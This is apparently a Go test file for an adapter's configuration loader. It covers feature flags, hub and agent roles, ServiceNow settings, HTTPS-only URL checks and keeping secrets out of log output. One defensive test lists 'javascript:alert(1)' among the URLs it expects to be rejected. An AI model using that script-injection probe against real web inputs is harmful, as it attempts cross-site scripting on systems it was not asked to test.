package config_test

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"log/slog"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/percona/pds/adapter/internal/config"
	"github.com/percona/pds/adapter/internal/features"
)

// clearEnv blanks every variable Load reads so a test starts from defaults.
// An empty value is treated the same as unset, and t.Setenv restores the
// previous value when the test ends.
func clearEnv(t *testing.T) {
	t.Helper()

	for _, key := range []string{
		"ADAPTER_ADDR",
		"ADAPTER_ENV",
		"ADAPTER_LOG_LEVEL",
		"ADAPTER_SHUTDOWN_TIMEOUT",
		"EVEREST_URL",
		"EVEREST_CLUSTER",
		"EVEREST_BACKUP_STORAGE",
		"EVEREST_MONITORING_CONFIG",
		"PMM_URL",
		"PMM_TOKEN",
		"OIDC_ISSUER",
		"OIDC_CLIENT_ID",
		"OIDC_CLIENT_SECRET",
		"OIDC_SCOPES",
		"SIGNUP_ENABLED",
		"SIGNUP_ORGANIZATION_CEILING",
		"INVITATION_TTL",
		"INVITATION_FROM",
		"SUPPORT_TAILNET",
		"SUPPORT_TAILNET_DOMAIN",
		"SUPPORT_TAILNET_URL",
		"SUPPORT_TAILNET_KEY_CLIENT_ID",
		"SUPPORT_TAILNET_KEY_CLIENT_SECRET",
		"SUPPORT_TAILNET_SERVICE_CLIENT_ID",
		"SUPPORT_TAILNET_SERVICE_CLIENT_SECRET",
		"SUPPORT_TAILNET_ENVIRONMENT_TAG",
		"SUPPORT_TAILNET_SERVICE_TAG",
		"SN_URL",
		"SUPPORT_GUIDE_URL",
		"SN_API_KEY",
		"SN_CLIENT_TOKEN",
		"POD_NAMESPACE",
		"SN_SECRET_NAME",
		"ASSISTANT_SECRET_NAME",
		"ANTHROPIC_API_KEY",
		"OIDC_AUDIENCE",
		"OIDC_DEVICE_CLIENT_ID",
		"ANTHROPIC_BASE_URL",
		"CURSOR_SECRET_NAME",
		"CURSOR_API_KEY",
		"ADAPTER_ROLE",
		"HUB_GIT_DIR",
		"HUB_URL",
		"HUB_PUBLIC_URL",
		"HUB_OAUTH_ISSUER",
		"HUB_GIT_URL",
		"HUB_GITHUB_ORG",
		"HUB_GITHUB_TOKEN",
		"HUB_GITHUB_APP_ID",
		"HUB_GITHUB_APP_INSTALLATION_ID",
		"HUB_GITHUB_APP_PRIVATE_KEY",
		"HUB_GITHUB_APP_PRIVATE_KEY_FILE",
		"HUB_REGISTRY_TOKEN",
		"HUB_AGENT_TOKEN",
		"HUB_OPERATOR_TOKEN",
		"HUB_AGENT_IMAGE",
		"HUB_CLUSTER_REGION",
		"ENVIRONMENT_NAME",
		"CLUSTER_NAME",
		"HUB_AGENT_ENVIRONMENTS",
		"HUB_AGENT_CLUSTERS", // allow-legacy-name
		"HUB_HEARTBEAT_STALE",
		"ACTIVITY_CONFIGMAP",
		"HUB_JOIN_SECRET",
		"HUB_INVENTORY_CONFIGMAP",
		"HUB_ORGANIZATION",
		"SES_REGION",
	} {
		t.Setenv(key, "")
	}

	// The HTTP role refuses to start without these. Tests that want that
	// refusal unset them. A GitHub backend unsets HUB_GIT_DIR itself.
	t.Setenv("HUB_GIT_DIR", "/tmp/hub-git")
	t.Setenv("HUB_PUBLIC_URL", "https://hub.example")

	for _, name := range features.Names() {
		t.Setenv(features.EnvVar(name), "")
	}
	for _, name := range features.Retired() {
		t.Setenv(features.EnvVar(name), "")
	}

	// An empty DATABASE_URL is a broken Secret and is refused, so the cleared
	// environment has to have no variable at all rather than an empty one.
	// t.Setenv first so the original value is restored when the test ends.
	t.Setenv("DATABASE_URL", "placeholder")
	os.Unsetenv("DATABASE_URL")
}

func TestLoadLeavesEveryFeatureUnset(t *testing.T) {
	clearEnv(t)

	got, err := config.Load()
	require.NoError(t, err)

	assert.Empty(t, got.Features, "an unset variable is not an opinion, so nothing is recorded")
}

func TestLoadReadsFeatureFlags(t *testing.T) {
	tests := []struct {
		name  string
		value string
		want  bool
	}{
		{name: "false", value: "false", want: false},
		{name: "true", value: "true", want: true},
		{name: "zero", value: "0", want: false},
		{name: "one", value: "1", want: true},
		{name: "off", value: "off", want: false},
		{name: "on", value: "on", want: true},
		{name: "no", value: "no", want: false},
		{name: "yes", value: "yes", want: true},
		{name: "padded and capitalized", value: "  FALSE  ", want: false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			clearEnv(t)
			t.Setenv("ADAPTER_FEATURE_CHAT", tc.value)

			got, err := config.Load()
			require.NoError(t, err)

			assert.Equal(t, map[string]bool{features.Chat: tc.want}, got.Features)
		})
	}
}

func TestLoadRejectsAVariableThatNamesNoSurface(t *testing.T) {
	clearEnv(t)
	t.Setenv("ADAPTER_FEATURE_BACKUP", "false")

	_, err := config.Load()

	require.Error(t, err)
	assert.Contains(t, err.Error(), "ADAPTER_FEATURE_BACKUP")
	assert.Contains(t, err.Error(), "names no product surface",
		"a near miss on a real surface has to be refused, not ignored")
}

func TestLoadIgnoresARetiredFeatureFlag(t *testing.T) {
	const retired = "retired-surface"
	restore := features.SetRetiredForTest([]string{retired})
	t.Cleanup(restore)

	tests := []struct {
		name  string
		value string
	}{
		{name: "true", value: "true"},
		{name: "false", value: "false"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			clearEnv(t)
			t.Setenv("ADAPTER_FEATURE_CHAT", "false")
			t.Setenv(features.EnvVar(retired), tc.value)
			warnings := captureWarnings(t)

			got, err := config.Load()
			require.NoError(t, err)

			assert.Equal(t, map[string]bool{features.Chat: false}, got.Features)
			assert.NotContains(t, got.Features, retired)

			gotWarnings := warnings()
			require.Len(t, gotWarnings, 1)
			assert.Contains(t, gotWarnings[0], features.EnvVar(retired))
			assert.Contains(t, gotWarnings[0], "ignored")
			assert.Contains(t, gotWarnings[0], "later release")
		})
	}
}

func TestLoadRefusesAPublishedFlagThatIsAlsoRetired(t *testing.T) {
	restore := features.SetRetiredForTest([]string{features.Metrics})
	t.Cleanup(restore)

	clearEnv(t)
	t.Setenv(features.EnvVar(features.Metrics), "false")

	_, err := config.Load()
	require.Error(t, err)
	assert.Contains(t, err.Error(), features.EnvVar(features.Metrics))
	assert.Contains(t, err.Error(), "both a published surface and a retired flag")
	assert.NotContains(t, err.Error(), "names no product surface")
}

func TestLoadIgnoresTheRetiredAlertAnalysisFlag(t *testing.T) {
	clearEnv(t)
	t.Setenv(features.EnvVar(features.AlertAnalysis), "false")
	warnings := captureWarnings(t)

	got, err := config.Load()
	require.NoError(t, err)
	assert.NotContains(t, got.Features, features.AlertAnalysis)

	set, err := features.New(got.Features)
	require.NoError(t, err)
	t.Cleanup(func() { _ = set.Close(context.Background()) })

	_, published := set.Resolve(context.Background())[features.AlertAnalysis]
	assert.False(t, published, "a retired name is absent from the resolved set")

	gotWarnings := warnings()
	require.Len(t, gotWarnings, 1)
	assert.Contains(t, gotWarnings[0], features.EnvVar(features.AlertAnalysis))
	assert.Contains(t, gotWarnings[0], "ignored")
	assert.Contains(t, gotWarnings[0], "later release")
}

func TestLoadIgnoresTheRetiredLogsFlag(t *testing.T) {
	clearEnv(t)
	t.Setenv(features.EnvVar(features.Logs), "false")
	warnings := captureWarnings(t)

	got, err := config.Load()
	require.NoError(t, err)
	assert.NotContains(t, got.Features, features.Logs)

	set, err := features.New(got.Features)
	require.NoError(t, err)
	t.Cleanup(func() { _ = set.Close(context.Background()) })

	_, published := set.Resolve(context.Background())[features.Logs]
	assert.False(t, published, "a retired name is absent from the resolved set")

	gotWarnings := warnings()
	require.Len(t, gotWarnings, 1)
	assert.Contains(t, gotWarnings[0], features.EnvVar(features.Logs))
	assert.Contains(t, gotWarnings[0], "ignored")
	assert.Contains(t, gotWarnings[0], "later release")
}

func TestLoadIgnoresTheRetiredAlertsFlag(t *testing.T) {
	clearEnv(t)
	t.Setenv(features.EnvVar(features.Alerts), "false")
	warnings := captureWarnings(t)

	got, err := config.Load()
	require.NoError(t, err)
	assert.NotContains(t, got.Features, features.Alerts)

	set, err := features.New(got.Features)
	require.NoError(t, err)
	t.Cleanup(func() { _ = set.Close(context.Background()) })

	_, published := set.Resolve(context.Background())[features.Alerts]
	assert.False(t, published, "a retired name is absent from the resolved set")
	assert.False(t, features.Known(features.Alerts))

	gotWarnings := warnings()
	require.Len(t, gotWarnings, 1)
	assert.Contains(t, gotWarnings[0], features.EnvVar(features.Alerts))
	assert.Contains(t, gotWarnings[0], "ignored")
	assert.Contains(t, gotWarnings[0], "later release")
}

func TestLoadIgnoresTheRetiredPlatformStatusFlag(t *testing.T) {
	clearEnv(t)
	t.Setenv(features.EnvVar(features.PlatformStatus), "false")
	warnings := captureWarnings(t)

	got, err := config.Load()
	require.NoError(t, err)
	assert.NotContains(t, got.Features, features.PlatformStatus)

	set, err := features.New(got.Features)
	require.NoError(t, err)
	t.Cleanup(func() { _ = set.Close(context.Background()) })

	_, published := set.Resolve(context.Background())[features.PlatformStatus]
	assert.False(t, published, "a retired name is absent from the resolved set")
	assert.False(t, features.Known(features.PlatformStatus))

	gotWarnings := warnings()
	require.Len(t, gotWarnings, 1)
	assert.Contains(t, gotWarnings[0], features.EnvVar(features.PlatformStatus))
	assert.Contains(t, gotWarnings[0], "ignored")
	assert.Contains(t, gotWarnings[0], "later release")
}

func TestLoadIgnoresTheRetiredInvestigateFlag(t *testing.T) {
	clearEnv(t)
	t.Setenv(features.EnvVar(features.Investigate), "false")
	warnings := captureWarnings(t)

	got, err := config.Load()
	require.NoError(t, err)
	assert.NotContains(t, got.Features, features.Investigate)

	set, err := features.New(got.Features)
	require.NoError(t, err)
	t.Cleanup(func() { _ = set.Close(context.Background()) })

	_, published := set.Resolve(context.Background())[features.Investigate]
	assert.False(t, published, "a retired name is absent from the resolved set")

	gotWarnings := warnings()
	require.Len(t, gotWarnings, 1)
	assert.Contains(t, gotWarnings[0], features.EnvVar(features.Investigate))
	assert.Contains(t, gotWarnings[0], "ignored")
	assert.Contains(t, gotWarnings[0], "later release")
}

func TestLoadIgnoresTheRetiredRecommendationsFlag(t *testing.T) {
	clearEnv(t)
	t.Setenv(features.EnvVar(features.Recommendations), "false")
	warnings := captureWarnings(t)

	got, err := config.Load()
	require.NoError(t, err)
	assert.NotContains(t, got.Features, features.Recommendations)

	set, err := features.New(got.Features)
	require.NoError(t, err)
	t.Cleanup(func() { _ = set.Close(context.Background()) })

	_, published := set.Resolve(context.Background())[features.Recommendations]
	assert.False(t, published, "a retired name is absent from the resolved set")

	gotWarnings := warnings()
	require.Len(t, gotWarnings, 1)
	assert.Contains(t, gotWarnings[0], features.EnvVar(features.Recommendations))
	assert.Contains(t, gotWarnings[0], "ignored")
	assert.Contains(t, gotWarnings[0], "later release")
}

func TestLoadLeavesAnEmptyRetiredFeatureUnset(t *testing.T) {
	const retired = "retired-surface"
	restore := features.SetRetiredForTest([]string{retired})
	t.Cleanup(restore)

	clearEnv(t)
	t.Setenv(features.EnvVar(retired), "   ")
	t.Setenv("ADAPTER_FEATURE_NOT_A_SURFACE", "")
	warnings := captureWarnings(t)

	got, err := config.Load()
	require.NoError(t, err)

	assert.Empty(t, got.Features)
	assert.Empty(t, warnings())
}

// captureWarnings installs a logger for the rest of the test and reports the
// warning messages written through it.
func captureWarnings(t *testing.T) func() []string {
	t.Helper()

	var buf bytes.Buffer
	previous := slog.Default()
	slog.SetDefault(slog.New(slog.NewJSONHandler(&buf, &slog.HandlerOptions{Level: slog.LevelDebug})))
	t.Cleanup(func() { slog.SetDefault(previous) })

	return func() []string {
		t.Helper()

		var warnings []string
		for _, line := range strings.Split(buf.String(), "\n") {
			if line == "" {
				continue
			}

			var rec struct {
				Level string `json:"level"`
				Msg   string `json:"msg"`
			}
			require.NoError(t, json.Unmarshal([]byte(line), &rec), line)
			if rec.Level == "WARN" {
				warnings = append(warnings, rec.Msg)
			}
		}

		return warnings
	}
}

func TestLoadIgnoresTheRetiredProviderFlags(t *testing.T) {
	for _, name := range []string{
		features.AssistantOpenAI,
		features.AssistantGemini,
		features.AssistantOpenRouter,
	} {
		t.Run(name, func(t *testing.T) {
			clearEnv(t)
			t.Setenv(features.EnvVar(name), "true")
			warnings := captureWarnings(t)

			got, err := config.Load()
			require.NoError(t, err)
			assert.NotContains(t, got.Features, name)
			assert.False(t, features.Known(name))

			gotWarnings := warnings()
			require.Len(t, gotWarnings, 1)
			assert.Contains(t, gotWarnings[0], features.EnvVar(name))
			assert.Contains(t, gotWarnings[0], "ignored")
			assert.Contains(t, gotWarnings[0], "later release")
		})
	}
}

func TestLoadWarnsOncePerRemovedProviderKeyVariable(t *testing.T) {
	for _, key := range []string{"ANTHROPIC_API_KEY", "ANTHROPIC_BASE_URL", "CURSOR_API_KEY"} {
		t.Run(key, func(t *testing.T) {
			clearEnv(t)
			t.Setenv(key, "sk-removed-value")
			warnings := captureWarnings(t)

			_, err := config.Load()
			require.NoError(t, err)

			gotWarnings := warnings()
			require.Len(t, gotWarnings, 1)
			assert.Contains(t, gotWarnings[0], key)
			assert.Contains(t, gotWarnings[0], "no longer read")
			assert.Contains(t, gotWarnings[0], "console")
			assert.NotContains(t, gotWarnings[0], "sk-removed-value")
		})
	}
}

func TestLoadWarnsOncePerRemovedDeviceFlowVariable(t *testing.T) {
	for _, key := range []string{"OIDC_AUDIENCE", "OIDC_DEVICE_CLIENT_ID"} {
		t.Run(key, func(t *testing.T) {
			clearEnv(t)
			t.Setenv(key, "https://pds.example/api")
			warnings := captureWarnings(t)

			_, err := config.Load()
			require.NoError(t, err)

			gotWarnings := warnings()
			require.Len(t, gotWarnings, 1)
			assert.Contains(t, gotWarnings[0], key)
			assert.Contains(t, gotWarnings[0], "no longer read")
			assert.Contains(t, gotWarnings[0], "OAuth")
			assert.NotContains(t, gotWarnings[0], "pds.example")
		})
	}
}

func TestLoadStaysQuietWhenNoRemovedProviderKeyVariableIsSet(t *testing.T) {
	clearEnv(t)
	warnings := captureWarnings(t)

	_, err := config.Load()
	require.NoError(t, err)

	assert.Empty(t, warnings())
}

func TestLoadReadsTheMCPSurface(t *testing.T) {
	clearEnv(t)
	t.Setenv("ADAPTER_FEATURE_MCP", "false")

	got, err := config.Load()
	require.NoError(t, err)

	assert.Equal(t, map[string]bool{features.MCP: false}, got.Features)
}

func TestLoadRejectsAMisspeltProviderSurface(t *testing.T) {
	clearEnv(t)
	t.Setenv("ADAPTER_FEATURE_ASSISTANT_OPEN_AI", "false")

	_, err := config.Load()

	require.Error(t, err)
	assert.Contains(t, err.Error(), "ADAPTER_FEATURE_ASSISTANT_OPEN_AI")
}

func TestLoadRejectsAnUnreadableFeatureValue(t *testing.T) {
	clearEnv(t)
	t.Setenv("ADAPTER_FEATURE_BACKUPS", "maybe")

	_, err := config.Load()

	require.Error(t, err)
	assert.Contains(t, err.Error(), "ADAPTER_FEATURE_BACKUPS",
		"the error names the variable an operator has to fix")
}

func TestLoadDefaults(t *testing.T) {
	clearEnv(t)

	got, err := config.Load()
	require.NoError(t, err)

	assert.Equal(t, ":8080", got.Addr)
	assert.Equal(t, config.EnvDev, got.Env)
	assert.Equal(t, slog.LevelInfo, got.LogLevel)
	assert.Empty(t, got.EverestURL)
	assert.Equal(t, "main", got.EverestCluster)
	assert.Empty(t, got.EverestMonitoringConfig)
	assert.Empty(t, got.PMMURL)
	assert.Empty(t, got.PMMToken)
	assert.Empty(t, got.OIDCIssuer)
	assert.Empty(t, got.OIDCClientID)
	assert.Empty(t, got.OIDCClientSecret)
	assert.Empty(t, got.OIDCScopes, "empty scopes mean the default set")
	assert.False(t, got.SignupEnabled, "signup is off unless an operator turns it on")
	assert.Equal(t, 1000, got.SignupOrganizationCeiling)
	assert.Empty(t, got.ServiceNowURL, "support stays off until an operator sets SN_URL")
	assert.False(t, got.ServiceNowConfigured(), "no Secret means the support routes answer 501")
	assert.Equal(t, "pds-servicenow", got.ServiceNowSecret())
	assert.Equal(t, "pds-assistant", got.AssistantSecret())
	assert.Equal(t, "pds-cursor", got.CursorSecret())
	assert.Equal(t, "pds", got.ConnectionsNamespace())
	assert.Equal(t, config.RoleHTTP, got.Role)
	assert.Equal(t, "pds-activity", got.ActivityConfigMap())
	assert.Equal(t, "pds-join-tokens", got.HubJoinSecret())
	assert.Equal(t, "pds-hub-inventory", got.HubInventoryConfigMap())
}

func TestLoadAcceptsAgentRole(t *testing.T) {
	clearEnv(t)
	t.Setenv("ADAPTER_ROLE", "agent")
	t.Setenv("HUB_URL", "http://hub.example")
	t.Setenv("ENVIRONMENT_NAME", "spoke-a")
	t.Setenv("HUB_GIT_DIR", "/tmp/hub-git")

	got, err := config.Load()
	require.NoError(t, err)
	assert.Equal(t, config.RoleAgent, got.Role)
	assert.Equal(t, "http://hub.example", got.HubURL)
	assert.Equal(t, "spoke-a", got.EnvironmentName)
	assert.True(t, got.HubEnabled())
	assert.Equal(t, 90*time.Second, got.HeartbeatStale)
}

func TestLoadHubConnectURLs(t *testing.T) {
	clearEnv(t)
	t.Setenv("HUB_GIT_DIR", "/tmp/hub-git")
	t.Setenv("HUB_OPERATOR_TOKEN", "op-secret")
	t.Setenv("HUB_PUBLIC_URL", "https://hub.example")
	t.Setenv("HUB_GIT_URL", "https://github.com/example/pds.git")

	got, err := config.Load()
	require.NoError(t, err)
	assert.Equal(t, "https://hub.example", got.HubPublicURL)
	assert.Equal(t, "https://github.com/example/pds.git", got.HubGitURL)
	assert.Equal(t, "op-secret", got.HubOperatorToken)
	assert.True(t, got.ServesHubAPI())
}

func TestLoadGitHubHubWithoutGitDir(t *testing.T) {
	clearEnv(t)
	t.Setenv("HUB_GIT_DIR", "")
	t.Setenv("HUB_GITHUB_ORG", "percona-cloud")
	t.Setenv("HUB_GITHUB_TOKEN", "ghs_test")
	t.Setenv("HUB_OPERATOR_TOKEN", "op-secret")
	t.Setenv("HUB_PUBLIC_URL", "https://hub.example")

	got, err := config.Load()
	require.NoError(t, err)
	assert.True(t, got.HubEnabled())
	assert.True(t, got.HubGitHubConfigured())
	assert.True(t, got.ServesHubAPI())
	assert.Equal(t, "https://github.com/percona-cloud/spoke-a.git", got.HubGitHubCloneURL("spoke-a"))
	assert.Equal(t, "ssh://git@github.com/percona-cloud/spoke-a.git", got.HubGitHubSSHURL("spoke-a"))
	assert.Equal(t, "https://github.com/percona-cloud/acme-prod.git", got.HubGitHubCloneURL("acme-prod"))
	assert.Equal(t, "ssh://git@github.com/percona-cloud/acme-prod.git", got.HubGitHubSSHURL("acme-prod"))
	assert.Empty(t, got.HubRegistryToken)
}

func TestLoadMintsAnOperatorTokenWhenUnset(t *testing.T) {
	clearEnv(t)
	t.Setenv("HUB_GIT_DIR", "/tmp/hub-git")
	t.Setenv("HUB_PUBLIC_URL", "https://hub.example")

	got, err := config.Load()
	require.NoError(t, err)
	assert.Len(t, got.HubOperatorToken, 64)

	second, err := config.Load()
	require.NoError(t, err)
	assert.NotEqual(t, got.HubOperatorToken, second.HubOperatorToken,
		"each hub process should mint its own token")
}

func TestLoadKeepsAGivenOperatorToken(t *testing.T) {
	clearEnv(t)
	t.Setenv("HUB_GIT_DIR", "/tmp/hub-git")
	t.Setenv("HUB_PUBLIC_URL", "https://hub.example")
	t.Setenv("HUB_OPERATOR_TOKEN", "op-secret")

	got, err := config.Load()
	require.NoError(t, err)
	assert.Equal(t, "op-secret", got.HubOperatorToken)
}

func TestLoadHTTPRoleRequiresAHub(t *testing.T) {
	clearEnv(t)
	t.Setenv("HUB_GIT_DIR", "")
	t.Setenv("HUB_PUBLIC_URL", "")

	_, err := config.Load()
	require.Error(t, err)
	for _, name := range []string{"HUB_GIT_DIR", "HUB_GITHUB_ORG", "HUB_GITHUB_TOKEN", "HUB_PUBLIC_URL"} {
		assert.Contains(t, err.Error(), name)
	}
}

func TestLoadRejectsHubWithoutPublicURL(t *testing.T) {
	clearEnv(t)
	t.Setenv("HUB_GIT_DIR", "/tmp/hub-git")
	t.Setenv("HUB_PUBLIC_URL", "")
	t.Setenv("HUB_OPERATOR_TOKEN", "op-secret")

	_, err := config.Load()
	require.Error(t, err)
	for _, name := range []string{"HUB_GIT_DIR", "HUB_GITHUB_ORG", "HUB_GITHUB_TOKEN", "HUB_PUBLIC_URL"} {
		assert.Contains(t, err.Error(), name)
	}
}

func TestLoadAgentRoleDoesNotRequireOperatorToken(t *testing.T) {
	clearEnv(t)
	t.Setenv("ADAPTER_ROLE", "agent")
	t.Setenv("HUB_URL", "http://hub.example")
	t.Setenv("ENVIRONMENT_NAME", "spoke-a")
	t.Setenv("HUB_GIT_DIR", "/tmp/hub-git")

	got, err := config.Load()
	require.NoError(t, err)
	assert.True(t, got.HubEnabled())
	assert.False(t, got.ServesHubAPI())
}

func TestLoadRejectsGitDirWithGitHubHub(t *testing.T) {
	clearEnv(t)
	t.Setenv("HUB_GIT_DIR", "/tmp/hub-git")
	t.Setenv("HUB_GITHUB_ORG", "percona-cloud")
	t.Setenv("HUB_GITHUB_TOKEN", "ghs_test")

	_, err := config.Load()
	require.Error(t, err)
	assert.Contains(t, err.Error(), "HUB_GIT_DIR")
	assert.Contains(t, err.Error(), "HUB_GITHUB_ORG")
}

func TestLoadHubRegistryToken(t *testing.T) {
	clearEnv(t)
	t.Setenv("HUB_GIT_DIR", "")
	t.Setenv("HUB_GITHUB_ORG", "percona-cloud")
	t.Setenv("HUB_GITHUB_TOKEN", "ghs_test")
	t.Setenv("HUB_OPERATOR_TOKEN", "op-secret")
	t.Setenv("HUB_PUBLIC_URL", "https://hub.example")
	t.Setenv("HUB_REGISTRY_TOKEN", "ghs_packages")

	got, err := config.Load()
	require.NoError(t, err)
	assert.Equal(t, "ghs_packages", got.HubRegistryToken)
}

func TestLoadGitHubOrgRequiresToken(t *testing.T) {
	clearEnv(t)
	t.Setenv("HUB_GITHUB_ORG", "percona-cloud")

	_, err := config.Load()
	require.Error(t, err)
	assert.Contains(t, err.Error(), "HUB_GITHUB_TOKEN")
}

func TestLoadRejectsUnknownRole(t *testing.T) {
	clearEnv(t)
	t.Setenv("ADAPTER_ROLE", "cron")

	_, err := config.Load()
	require.Error(t, err)
	assert.Contains(t, err.Error(), "ADAPTER_ROLE")
}

func TestLoadRefusesTheWorkerRole(t *testing.T) {
	clearEnv(t)
	t.Setenv("ADAPTER_ROLE", "worker")

	_, err := config.Load()
	require.Error(t, err)
	assert.Contains(t, err.Error(), `ADAPTER_ROLE must be empty, "http", or "agent", got "worker"`)
}

func TestServiceNowNeedsBothTokens(t *testing.T) {
	tests := []struct {
		name  string
		key   string
		token string
		want  bool
	}{
		{name: "neither", want: false},
		{name: "key only", key: "api-key-value", want: false},
		{name: "token only", token: "client-token-value", want: false},
		{name: "both", key: "api-key-value", token: "client-token-value", want: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			clearEnv(t)
			t.Setenv("SN_API_KEY", tt.key)
			t.Setenv("SN_CLIENT_TOKEN", tt.token)

			got, err := config.Load()
			require.NoError(t, err)
			assert.Equal(t, tt.want, got.ServiceNowConfigured())
		})
	}
}

func TestServiceNowURLIsOverridable(t *testing.T) {
	clearEnv(t)
	t.Setenv("SN_URL", "https://example.service-now.com")

	got, err := config.Load()
	require.NoError(t, err)
	assert.Equal(t, "https://example.service-now.com", got.ServiceNowURL)
}

func TestSupportGuideURLHasNoDefault(t *testing.T) {
	clearEnv(t)

	got, err := config.Load()
	require.NoError(t, err)
	assert.Empty(t, got.SupportGuideURL, "case notes carry no guide link until an operator sets one")
}

func TestSupportGuideURLIsReadFromTheEnvironment(t *testing.T) {
	clearEnv(t)
	t.Setenv("SUPPORT_GUIDE_URL", "  https://guide.example/support-access  ")

	got, err := config.Load()
	require.NoError(t, err)
	assert.Equal(t, "https://guide.example/support-access", got.SupportGuideURL)
}

func TestSupportGuideURLEmptyIsUnset(t *testing.T) {
	clearEnv(t)
	t.Setenv("SUPPORT_GUIDE_URL", "   ")

	got, err := config.Load()
	require.NoError(t, err)
	assert.Empty(t, got.SupportGuideURL)
}

// The link is written into case notes and shown in the console, so it has to
// be a plain https address and nothing a reader could mistake for something else.
func TestSupportGuideURLMustBeHTTPS(t *testing.T) {
	for _, url := range []string{"http://guide.example/x", "guide.example/x", "https://", "javascript:alert(1)"} {
		t.Run(url, func(t *testing.T) {
			clearEnv(t)
			t.Setenv("SUPPORT_GUIDE_URL", url)

			_, err := config.Load()
			require.Error(t, err)
			assert.Contains(t, err.Error(), "SUPPORT_GUIDE_URL")
		})
	}
}

// The ServiceNow tokens travel in the header and the body of every call, so a
// plaintext instance would hand them to anything on the path.
func TestServiceNowURLMustBeHTTPS(t *testing.T) {
	tests := []struct {
		name string
		url  string
	}{
		{name: "plaintext", url: "http://example.service-now.com"},
		{name: "in-cluster stand-in", url: "http://pds-servicenow:8080"},
		{name: "no scheme", url: "example.service-now.com"},
		{name: "no host", url: "https://"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			clearEnv(t)
			t.Setenv("SN_URL", tt.url)

			_, err := config.Load()
			require.Error(t, err)
			assert.Contains(t, err.Error(), "SN_URL")
		})
	}
}

func TestLoadEnvOverride(t *testing.T) {
	clearEnv(t)

	t.Setenv("ADAPTER_ADDR", "localhost:9090")
	t.Setenv("ADAPTER_ENV", "prod")
	t.Setenv("ADAPTER_LOG_LEVEL", "debug")
	t.Setenv("EVEREST_URL", "https://everest.example.com")
	t.Setenv("EVEREST_CLUSTER", "edge")
	t.Setenv("EVEREST_MONITORING_CONFIG", "pmm")
	t.Setenv("PMM_URL", "https://pmm.example.com")
	t.Setenv("PMM_TOKEN", "glsa_service_token")
	t.Setenv("OIDC_ISSUER", "https://auth.example.com")
	t.Setenv("OIDC_CLIENT_ID", "pds-console")
	t.Setenv("OIDC_CLIENT_SECRET", "console-secret")
	t.Setenv("OIDC_SCOPES", "openid email offline_access")
	t.Setenv("SN_API_KEY", "api-key-value")
	t.Setenv("SN_CLIENT_TOKEN", "client-token-value")

	got, err := config.Load()
	require.NoError(t, err)

	assert.Equal(t, "localhost:9090", got.Addr)
	assert.Equal(t, config.EnvProd, got.Env)
	assert.Equal(t, slog.LevelDebug, got.LogLevel)
	assert.Equal(t, "https://everest.example.com", got.EverestURL)
	assert.Equal(t, "edge", got.EverestCluster)
	assert.Equal(t, "pmm", got.EverestMonitoringConfig)
	assert.Equal(t, "https://pmm.example.com", got.PMMURL)
	assert.Equal(t, "glsa_service_token", got.PMMToken)
	assert.Equal(t, "https://auth.example.com", got.OIDCIssuer)
	assert.Equal(t, "pds-console", got.OIDCClientID)
	assert.Equal(t, "console-secret", got.OIDCClientSecret)
	assert.Equal(t, []string{"openid", "email", "offline_access"}, got.OIDCScopes)
	assert.Equal(t, "api-key-value", got.ServiceNowAPIKey)
	assert.Equal(t, "client-token-value", got.ServiceNowClientToken)
}

func TestLoadRejectsBadValues(t *testing.T) {
	tests := []struct {
		name string
		key  string
		val  string
	}{
		{name: "unknown environment", key: "ADAPTER_ENV", val: "staging-ish"},
		{name: "unknown log level", key: "ADAPTER_LOG_LEVEL", val: "loud"},
		{name: "unparsable timeout", key: "ADAPTER_SHUTDOWN_TIMEOUT", val: "soon"},
		{name: "empty address", key: "ADAPTER_ADDR", val: "   "},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			clearEnv(t)
			t.Setenv(tt.key, tt.val)

			_, err := config.Load()
			require.Error(t, err)
			assert.Contains(t, err.Error(), tt.key)
		})
	}
}

func TestLoadNeverPrintsSecrets(t *testing.T) {
	clearEnv(t)
	t.Setenv("SN_API_KEY", "super-secret-key")
	t.Setenv("SN_CLIENT_TOKEN", "super-secret-token")

	got, err := config.Load()
	require.NoError(t, err)

	assert.NotContains(t, got.String(), "super-secret-key")
	assert.NotContains(t, got.String(), "super-secret-token")
	assert.Contains(t, got.String(), ":8080")
}

func TestProductionUsesJSONLogs(t *testing.T) {
	clearEnv(t)
	t.Setenv("ADAPTER_ENV", "prod")

	got, err := config.Load()
	require.NoError(t, err)
	assert.True(t, got.Env.IsProduction())

	clearEnv(t)
	got, err = config.Load()
	require.NoError(t, err)
	assert.False(t, got.Env.IsProduction())
}

func TestActivityConfigMapDefaults(t *testing.T) {
	t.Parallel()

	assert.Equal(t, "pds-activity", config.Config{}.ActivityConfigMap())
	assert.Equal(t, "custom-ring", config.Config{ActivityConfigMapName: "custom-ring"}.ActivityConfigMap())
}

func TestHubPersistObjectDefaults(t *testing.T) {
	t.Parallel()

	assert.Equal(t, "pds-join-tokens", config.Config{}.HubJoinSecret())
	assert.Equal(t, "named-join", config.Config{HubJoinSecretName: "named-join"}.HubJoinSecret())
	assert.Equal(t, "pds-hub-inventory", config.Config{}.HubInventoryConfigMap())
	assert.Equal(t, "named-inv", config.Config{HubInventoryConfigMapName: "named-inv"}.HubInventoryConfigMap())
}

// TestLoadRefusesThePublishedAgentToken covers the value an earlier chart
// shipped. It is in the repository history, so it authenticates nobody.
func TestLoadRefusesThePublishedAgentToken(t *testing.T) {
	clearEnv(t)
	t.Setenv("HUB_AGENT_TOKEN", "poc-agent-token")

	_, err := config.Load()
	require.Error(t, err)
	assert.Contains(t, err.Error(), "HUB_AGENT_TOKEN")
}

// TestLoadReadsTheAgentEnvironmentScope covers the list that stops the shared
// token from authorizing every environment name.
func TestLoadReadsTheAgentEnvironmentScope(t *testing.T) {
	clearEnv(t)
	t.Setenv("HUB_AGENT_TOKEN", "lab-token")
	t.Setenv("HUB_AGENT_ENVIRONMENTS", " spoke-a , ,spoke-b ")

	cfg, err := config.Load()
	require.NoError(t, err)
	assert.Equal(t, []string{"spoke-a", "spoke-b"}, cfg.HubAgentEnvironments)
}

// A deployment that has not renamed its settings keeps working for a release.
